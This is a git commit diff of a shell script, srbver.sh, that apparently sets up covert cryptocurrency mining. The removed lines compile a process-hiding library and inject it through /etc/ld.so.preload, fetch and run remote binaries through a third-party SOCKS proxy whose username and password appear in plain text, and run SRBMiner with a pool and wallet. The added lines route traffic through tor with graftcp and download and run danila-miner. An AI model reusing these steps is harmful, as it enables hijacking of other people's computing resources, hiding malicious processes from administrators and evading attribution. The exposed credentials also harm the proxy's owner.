d6193f238bd0020d8fb6334929e2129e6bc7708b
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-23 23:50:07 +0700

    Update srbver.sh

--- srbver.sh
+++ srbver.sh
@@ -1,20 +1,18 @@
 #!/bin/sh
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233 
-loglevel = 1 
-socks5 = 175.162.70.46:1080 
-socks5_username = mikrotik999 
-socks5_password = Elibawnos 
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:9050
+socks5_username =
+socks5_password =
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -22,44 +20,11 @@ END
 sleep .2
 
 echo " "
-
 echo " "
 
-echo "**"
+echo "******************************************************************"
 
-./graftcp/graftcp curl ifconfig.me
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
+tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz
 
-echo " "
-
-echo " "
-
-echo "**"
-
-echo " "
-
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash
-
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
-unzip magicBezzHash.zip
-
-make
-
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
-mv libprocesshider.so /usr/local/lib/
-
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
-tar -xvf SRBMiner-Multi-0-8-5-Linux.tar.xz
-cd SRBMiner-Multi-0-8-5
-sudo ./guided-setup.sh
-verushash
-stratum+tcp://eu.luckpool.net:3956
-RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.404N0tF0und
-sudo ./start_verushash.sh
+./graftcp/graftcp ./danila-miner run https://server1.whalestonpool.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
